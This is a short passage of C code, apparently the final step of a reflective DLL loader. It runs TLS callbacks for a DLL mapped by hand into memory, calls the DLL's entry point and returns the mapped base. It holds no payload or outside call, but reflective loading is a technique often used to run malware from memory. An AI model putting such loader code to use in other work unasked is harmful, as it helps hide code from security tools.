    RefCallTlsCallbacks(mappedBase, mappedNt);

    /* 12. 调用 DLL 入口点 */
    if (mappedNt->OptionalHeader.AddressOfEntryPoint) {
        REF_DLL_MAIN entry;

        entry = REF_RVA(REF_DLL_MAIN, mappedBase, mappedNt->OptionalHeader.AddressOfEntryPoint);
        if (!entry((HINSTANCE)mappedBase, DLL_PROCESS_ATTACH, lpParameter)) {
            return 0;
        }
    }

    return (ULONG_PTR)mappedBase;
}
